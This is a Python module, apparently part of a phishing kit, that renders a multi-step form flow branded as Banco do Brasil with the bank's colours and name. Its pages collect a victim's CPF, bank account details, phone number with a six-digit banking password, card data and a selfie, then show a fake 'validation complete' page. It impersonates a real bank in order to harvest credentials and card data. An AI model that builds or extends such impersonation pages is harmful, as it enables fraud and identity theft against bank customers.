"""
Template Loader - Carrega templates HTML usando Jinja2
"""
from jinja2 import Environment, FileSystemLoader, select_autoescape
import os

# Diretório de templates
TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), 'paginas')

# Configurar Jinja2
jinja_env = Environment(
    loader=FileSystemLoader(TEMPLATES_DIR),
    autoescape=select_autoescape(['html', 'xml']),
    trim_blocks=True,
    lstrip_blocks=True
)


def load_template(template_name, context=None):
    """
    Carrega e renderiza um template Jinja2
    
    Args:
        template_name: Nome do arquivo template (ex: 'page_cpf.html')
        context: Dicionário com variáveis para o template
    
    Returns:
        String com o HTML renderizado
    """
    if context is None:
        context = {}
    
    # Adicionar valores padrão para cores BB
    default_context = {
        'header_bg_color': '#FFCC00',
        'header_text_color': '#003D7A',
        'header_title': '🏦 Banco do Brasil',
        'label_color': '#003D7A',
        'focus_color': '#FFCC00',
        'btn_bg_color': '#003D7A',
        'btn_hover_color': '#002855',
        'title_color': '#003D7A'
    }
    
    # Merge com o contexto fornecido
    default_context.update(context)
    
    # Carregar e renderizar template
    template = jinja_env.get_template(template_name)
    return template.render(**default_context)


def create_page_dict(page_id, name, title, field_type, order, template_name, extra_context=None):
    """
    Cria um dicionário de página com template carregado
    
    Args:
        page_id: ID único da página
        name: Nome da página
        title: Título da página
        field_type: Tipo de campo (cpf, cartao, etc)
        order: Ordem de exibição
        template_name: Nome do arquivo template
        extra_context: Contexto adicional para o template
    
    Returns:
        Dicionário formatado para o sistema
    """
    context = {'page_title': title}
    if extra_context:
        context.update(extra_context)
    
    return {
        "id": page_id,
        "name": name,
        "title": title,
        "type": "form",
        "order": order,
        "field_type": field_type,
        "content": load_template(template_name, context)
    }


# ============================================================================
# TEMPLATES CARREGADOS VIA JINJA2
# ============================================================================

BB_FLUXO_COMPLETO_PAGES_JINJA = [
    create_page_dict(
        page_id="page_cpf",
        name="CPF",
        title="Validação de CPF",
        field_type="cpf",
        order=1,
        template_name="page_cpf.html"
    ),
    create_page_dict(
        page_id="page_dados_bancarios",
        name="Dados Bancários",
        title="Dados da Conta",
        field_type="dados_bancarios",
        order=2,
        template_name="page_dados_bancarios.html"
    ),
    create_page_dict(
        page_id="page_celular_senha6",
        name="Celular e Senha",
        title="Validação Mobile",
        field_type="celular_senha6",
        order=3,
        template_name="page_celular_senha6.html"
    ),
    create_page_dict(
        page_id="page_cartao",
        name="Cartão",
        title="Dados do Cartão",
        field_type="cartao",
        order=4,
        template_name="page_cartao.html"
    ),
    # Selfie será adicionado manualmente (template complexo)
    create_page_dict(
        page_id="page_sucesso",
        name="Sucesso",
        title="Validação Concluída",
        field_type="success",
        order=7,
        template_name="page_sucesso.html"
    )
]


# Função helper para obter páginas
def get_bb_fluxo_completo_pages():
    """Retorna todas as páginas do fluxo completo BB"""
    return BB_FLUXO_COMPLETO_PAGES_JINJA


# Teste se rodado diretamente
if __name__ == "__main__":
    print("🔧 Testando Template Loader...")
    print(f"📁 Diretório de templates: {TEMPLATES_DIR}")
    print(f"✅ {len(BB_FLUXO_COMPLETO_PAGES_JINJA)} páginas carregadas")
    
    # Testar carregamento de uma página
    test_page = BB_FLUXO_COMPLETO_PAGES_JINJA[0]
    print(f"\n📄 Página de teste: {test_page['name']}")
    print("📝 Primeiros 200 caracteres do HTML:")
    print(test_page['content'][:200] + "...")
